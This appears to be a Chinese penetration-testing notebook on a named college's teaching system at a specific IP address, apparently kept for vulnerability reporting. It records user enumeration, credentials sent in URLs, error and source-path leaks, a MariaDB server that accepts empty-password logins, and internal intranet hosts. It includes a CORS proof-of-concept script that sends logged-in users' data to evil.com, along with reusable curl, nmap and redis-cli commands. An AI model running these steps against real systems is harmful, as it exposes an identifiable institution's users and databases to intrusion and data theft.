# SPTC四川邮电职业技术学院 + beego框架测试模式 (2026-05)

目标: 1.95.78.227 (四川邮电职业技术学院 教学辅助系统) — Go beego 2.0.0 + Vue.js SPA + MariaDB + Redis

## beego框架指纹识别

```
特征:
- 404页面: "Powered by beego 2.0.0"
- 错误响应: {"code":1002,"message":"未授权访问","error":{"code":1002,"message":"未授权访问","detail":"[1002] 缺少Authorization头: ","file":"E:/workspace/src/EduManager/utils/middleware.go","line":154}}
- JWT认证: Authorization头 + sessionStorage存储
- Server头: nginx 1.21.5
```

## 关键API端点

### 登录API (GET方法! 凭证在URL中!)
```
GET /api/user/login/{username}/{password}
→ {"Title":"登录失败","Data":"密码错误","Code":1001} (用户存在)
→ {"Title":"登录失败","Data":"用户不存在","Code":1001} (用户不存在)

用户枚举: admin → "密码错误", test123 → "密码错误"
```

### 注册API (MySQL错误泄露)
```
POST /api/user/register
Content-Type: application/json
Body: {"username":"test","password":"test","name":"test","role":1}
→ {"Title":"注册失败","Data":"Error 1062 (23000): Duplicate entry '' for key 'PRIMARY'","Code":1001}

所有注册尝试都返回同一个MySQL错误(主键字段始终为空)
```

### 其他API端点 (全部需要JWT认证)
```
GET /api/user/ → 401
GET /api/depart/ → 401
GET /api/exam/ → 401
GET /api/active/ → 401
GET /api/rating/ → 401
GET /api/question/ → 401
GET /api/client/ → 401
POST /api/user/add → 401
POST /api/user/updateInfo/{id} → 401
POST /api/user/updatePswd/{id} → 401
DELETE /api/depart/{id} → 401
```

### 未授权端点 (SPA fallback)
```
/auth/login → 200 (返回SPA HTML, 767字节)
/exam/management → 200
/active/management → 200
/questionTemplate → 200
/rating → 200
/choujiang → 200
/profile → 200
/client/ → 200
```

## CORS反射型漏洞 (中危)

### 验证
```bash
curl -sk "https://1.95.78.227/api/user/register" \
  -H "Origin: http://evil.com" -D -
→ Access-Control-Allow-Origin: http://evil.com
→ Access-Control-Allow-Credentials: true
```

### 测试不同Origin
```
http://evil.com → 反射
https://attacker.com → 反射
http://localhost → 反射
null → 反射
http://sptc.edu.cn.evil.com → 反射
```

### PoC
```html
<script>
fetch('https://1.95.78.227/api/user/', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('http://evil.com/steal?data='+JSON.stringify(d)))
</script>
```

## 信息泄露

### 源码路径泄露
```
curl -sk "https://1.95.78.227/api/user/" -H "Authorization: Bearer invalid"
→ "file":"E:/workspace/src/EduManager/utils/middleware.go","line":154
```

### MySQL错误泄露
```
POST /api/user/register → Error 1062 (23000): Duplicate entry '' for key 'PRIMARY'
```

### 框架版本泄露
```
404页面 → "Powered by beego 2.0.0"
```

## 数据库端口暴露

```
3306/tcp → MariaDB 10.5.22 (nmap确认空密码可登录)
6379/tcp → Redis (需认证)
```

## 内网资产 (从目标可达)

```
10.255.11.39 → Coremail邮件系统 (XT5)
10.255.11.118 → Web服务器 (403)
10.255.11.121 → OA办公系统 (Apache Shiro)
```

## 确认可提交漏洞

### 1. [中危] CORS反射型漏洞
- 全站API反射任意Origin + 允许携带凭证
- 影响: 攻击者可通过恶意网站窃取已登录用户数据

### 2. [中危] 用户枚举
- GET /api/user/login/{user}/{pass}
- admin → "密码错误" vs nobody → "用户不存在"

### 3. [中危] 登录凭证URL明文传输
- GET /api/user/login/admin/MyPassword123
- 凭证在URL路径中

### 4. [低危] MySQL错误信息泄露
- POST /api/user/register
- Error 1062 (23000): Duplicate entry '' for key 'PRIMARY'

### 5. [低危] 源码路径泄露
- file: E:/workspace/src/EduManager/utils/middleware.go:154

### 6. [信息] MariaDB空密码
- nmap --script mysql-enum确认root/admin/test等用户空密码可登录

## 测试命令汇总

```bash
# beego指纹
curl -sk "https://TARGET/nonexist" | grep -i "beego"

# 登录API用户枚举
curl -sk "https://TARGET/api/user/login/admin/test"
curl -sk "https://TARGET/api/user/login/nobody/test"

# 注册API MySQL错误泄露
curl -sk -X POST "https://TARGET/api/user/register" \
  -H "Content-Type: application/json" -d '{}'

# CORS测试
curl -sk "https://TARGET/api/user/register" \
  -H "Origin: http://evil.com" -D -

# 源码路径泄露
curl -sk "https://TARGET/api/user/" -H "Authorization: Bearer invalid"

# MariaDB空密码测试
nmap -p 3306 --script mysql-enum TARGET

# Redis测试
redis-cli -h TARGET -p 6379 ping
```

## 排除项

- SQL注入: 后端使用参数化查询,admin'--行为是用户名字面量匹配
- OA Actuator: 301重定向到登录页,未实际暴露
- Redis弱口令: 常见密码未命中
- Coremail管理: admin模块已禁用
